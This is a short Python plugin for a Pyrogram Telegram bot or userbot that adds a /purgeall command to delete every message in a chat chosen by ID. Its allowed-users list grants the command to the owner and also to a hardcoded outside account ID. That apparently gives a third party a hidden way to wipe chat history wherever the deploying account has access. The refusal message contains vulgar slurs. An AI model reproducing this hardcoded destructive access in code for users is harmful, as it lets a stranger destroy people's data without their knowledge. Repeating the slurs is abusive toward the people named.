from Player import app
from pyrogram import Client, filters
from pyrogram.types import Message
import asyncio
from config import OWNER_ID

SUDO_USERS = [OWNER_ID, 8091116698]  


@app.on_message(filters.command("purgeall") & filters.user(SUDO_USERS))
async def purge_by_chat_id(client, message):
    user_id = message.from_user.id

    if user_id not in SUDO_USERS:
        return await message.reply("Only Rex Bhadwa And Abhi Randi Use This Command", quote=True)

    if len(message.command) < 2:
        return await message.reply("❌ Please provide a chat ID.\n\n**Usage:** `/purgeall -1001234567890`", quote=True)

    chat_id = message.command[1]
    try:
        chat_id = int(chat_id)
    except ValueError:
        return await message.reply("❌ Invalid Chat ID. Must be a number.")

    deleted_count = 0
    await message.reply(f"🧹 Starting purge in chat: `{chat_id}`")

    async for msg in client.get_chat_history(chat_id):
        try:
            await client.delete_messages(chat_id, msg.id)
            deleted_count += 1
            await asyncio.sleep(0.05)  # avoid floodwait
        except Exception as e:
            print(f"❌ Error deleting message {msg.id}: {e}")

    await client.send_message(chat_id, f"✅ Deleted {deleted_count} messages from this chat.")
    print(f"✅ Purged {deleted_count} messages from chat {chat_id} as @{client.me.username}")

print("✅ UserBot started...")
